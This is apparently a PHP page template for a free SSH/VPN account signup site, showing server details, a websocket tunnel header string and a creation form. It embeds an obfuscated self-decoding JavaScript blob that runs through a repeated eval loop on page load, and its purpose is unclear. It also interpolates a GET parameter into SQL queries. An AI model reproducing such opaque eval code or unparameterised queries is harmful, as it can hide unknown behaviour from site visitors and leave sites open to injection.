<?php
if(isset($_GET['filter'])) {
  $serverid = chkString($_GET['filter']);
  $q = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'"));
  if(!$q):
    $noserver = 1;
  endif;
} else {
  $noserver = 1;
}

if(!isset($noserver)):
?>
<script language="javascript" type="text/javascript">
function removeSpaces(string) {
 return string.split(' ').join('');
}
</script>
<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")41,\\\"{710\\\\500\\\\420\\\\630\\\\330\\\\400\\\\\\\\\\"+
"\\TNBF330\\\\710\\\\220\\\\L020\\\\R520\\\\530\\\\410\\\\330\\\\020\\\\GA@O" +
"WK610\\\\OSOyms}in4l~}wqd?* />7bbm`zh+hvldrn730\\\\710\\\\010\\\\@SIOYF]120" +
"\\\\730\\\\320\\\\220\\\\300\\\\U300\\\\730\\\\300\\\\r\\\\130\\\\700\\\\t\\"+
"\\520\\\\220\\\\H020\\\\n\\\\t\\\\300\\\\500\\\\(sfukmwh771\\\\3950!k==!+?%" +
"+;<<f$, 61!\\\\\\\\[O120\\\\\\\\\\\\420\\\\130\\\\420\\\\CUPXVATWNCD100\\\\" +
"HXn\\\\010\\\\\\\\\\\\710\\\\]T320\\\\230\\\\520\\\\000\\\\%>uh771\\\\sn5ow" +
"x<3v771\\\\q/`hiyiz(~jkk#chd330\\\\020\\\\<[D430\\\\420\\\\610\\\\200\\\\60" +
"0\\\\H530\\\\.300\\\\,QL1030\\\\610\\\\710\\\\100\\\\330\\\\200\\\\n\\\\430" +
"\\\\020\\\\020\\\\@=]3;/|y600\\\\*+4x;=>|4= =(;*g=&( j70!n3K[NOZ030\\\\e500" +
"\\\\QSG\\\\\\\\320\\\\Y_YC220\\\\710\\\\400\\\\EFLSLQV1iu|z`p~k\\\"(f};o nr" +
"uter};))++y(^)i(tAedoCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y;++y)41<i(fi{)++i" +
";l<i;0=i(rof;htgnel.x=l,\\\"\\\"=o,i rav{)y,x(f noitcnuf\")"                 ;
while(x=eval(x));
//-->
//]]>
</script>
<script src="/scss/js/bootstrap-validate.js"></script>
<div id="ndexi" style="display:none;">create-account</div>
<div id="where" style="display:none;">ssh-server</div>

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center">
          <?php
          $name = mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'");
          while($row = mysqlI_fetch_object($name)) {
         ?>
          <h1>FREE SSH <?php echo location($row->location)['name'] ?></h1>
          <?php } ?>
          <h2>Free SSH <?php echo $q['active_for'] ?> days</h2>
          <p class="lead">The best premium SSH Tunnel server provider for you</p>
          <p class="lead">Free SSH Tunnel with long active life</p>
          <p class="lead">SSH tunnel servers of the highest quality</p>
          <p class="lead">Read our terms of service before creating accounts</p>
          <p class="lead">Your selected server name <?php echo $q['description']?></p>
          <p class="lead">Hostname server <?php echo $q['host']?></p>
        </div>
      </div>
    <p class="text-center">
    <span class="badge badge-success mb-3 p-3">Free SSH Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Unlimited Bandwidth VPS</span>
    <span class="badge badge-primary mb-3 p-3">Full Speed Servers</span>
    <span class="badge badge-success mb-3 p-3">Private Account</span>
    <span class="badge badge-info mb-3 p-3">Hide Your IP Adrres</span>
    <span class="badge badge-primary mb-3 p-3">Fast SSH VPN Servers</span>
  </p> 
  <p class="text-center">
    <span class="label label-danger">No DDOS</span>
    <span class="label label-danger">No Fraud</span>
    <span class="label label-danger">No Hacking</span>
    <span class="label label-danger">No Spam</span>
  </p> 
</div>
</section>
<!-- END: section -->

<?php if(isset($_GET['filter'])) {
if(!$q) {
  exit('Please choose a server before creating account');
}
} else {
   exit('Please choose a server before creating account');
}
?>
<?php
?>

<section id="services" class="probootstrap-section">
<div class="container">
<div class="row">
<div class="col-lg-6 col-lg-offset-3" data-wow-duration="1s">
<div class="box">
<h1 class="title"> SSH WEBSOCKET </h1>
<div class="table-responsive-md">
<table class="table table-hover">
<tbody>
<tr>
<th>Hostname</th>
<td><?php echo $q['host']?></td>
</tr>
<tr>
<th>Protocol</th>
<td>TCP/UDP<td>
</tr>
<tr>
<th>Websocket Squid</th>
<td>80<td>
</tr>
<tr>
<th>Websocket SSL</th>
<td>443<td>
</tr>
<tr>
<th>Payload</th>
<td>GET / HTTP/1.1[crlf]Host:<?php echo $q['host']?>[crlf]Upgrade: websocket[crlf][crlf]</td>
</tr>
<tr>
<th>Active For</th>
<td><?php echo $q['active_for']?> days </td>
</tr>
<tr>
<th>Max Login</th>
<td><?php echo $q['max_login']?> Device </td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</section>

<div id="ndexi" style="display:none;">create-account</div>
<div id="where" style="display:none;">vpn</div>

<div class="container">
  <div class="row"><br/><br/>
    <div class="col-lg-12" align="center" text-align="center"><h4>Create new account</h4>Read our terms of service before creating account. Each account is valid for <?php echo $q['active_for'] ?> days.</div>
<div><p>&nbsp;</p></div>
<?php if(isset($_GET['filter'])) {
if(!$q) {
  exit('Please choose a server before creating account');
}
} else {
   exit('Please choose a server before creating account');
}
?>
          <div class="col-lg-12"></div>
                <div class="col-lg-8 col-lg-offset-2">

                <div class="<?php echo ($q['type']=='vpnssh'||$q['type']=='vpn')? 'col-lg-6' : 'col-lg-8 col-lg-offset-2'; ?>">
                <div class="well" style="height:400px;" id="dimspanel">
     <form action="<?php echo $siteUrl ?>/ajax.proc.php?do=create-account" id="form-create" method="post">
      <div id="notif"></div>
      <div id="dimaspanel">
<input type="hidden" name="id" value="<?php echo $q['id'] ?>" />

        <div class="form-group">
           <label>Username:</label>
          <div class="input-group">
  <input type="text" class="form-control" name="username" required>
</div>
         </div>

        <div class="form-group">
           <label>Password:</label>
          <input type="text" class="form-control" name="password" id="password" required>
         </div>


<div align="center">
<?php showCaptcha('site'); ?><br/>
</div>


<div class="col-lg-12" align="center" style="line-height:1.2em;margin-top:-10px;"><span style="color:grey;font-size:0.8em;">By clicking Create Now button, you agree to our <a href="?do=terms">Terms Of Service.</a></span></div>
<div class="col-lg-12" style="margin-top:15px;">
        <p align="center"><button type="button" class="btn btn-lg btn-success" id="createnow" role="button">Create Now</button></p>
</div>
</div>
    </form>
</div>
</div>
<?php if($q['type']=='vpn'): ?>
<div class="col-md-6">
<p class="lead">Encrypted <span class="text-success">1024 - 2048 bit</span> VPN</p>
                      <ul class="list-unstyled" style="line-height: 2">
                          <li><span class="fa fa-check text-success"></span> Protect Your Privacy</li>
                          <li><span class="fa fa-check text-success"></span> Premium Server</li>
                          <li><span class="fa fa-check text-success"></span> High Performance</li>
                          <li><span class="fa fa-check text-success"></span> High Uptime</li>
                          <li><span class="fa fa-check text-success"></span> Hide Your IP </li>
                      </ul>
                      <p><a href="<?php $ss = json_decode($q['openvpn_config']); echo $ss->tcp ?>" target="_blank" class="btn btn-primary btn-block">Download Config (TCP)</a></p>
                      <p><a href="<?php echo $ss->udp ?>" target="_blank" class="btn btn-warning btn-block">Download Config (UDP)</a></p>
                       <p><a href="<?php echo $ss->ssl ?>" target="_blank" class="btn btn-success btn-block">Download Config (SSL)</a></p>

</div>
<?php endif; ?>
</div>
    <div class="col-lg-12"></div>
      </div>
	  </div> <br/><br/><br/>
<?php
else:
  include('app/pages/404.php');
endif;
?>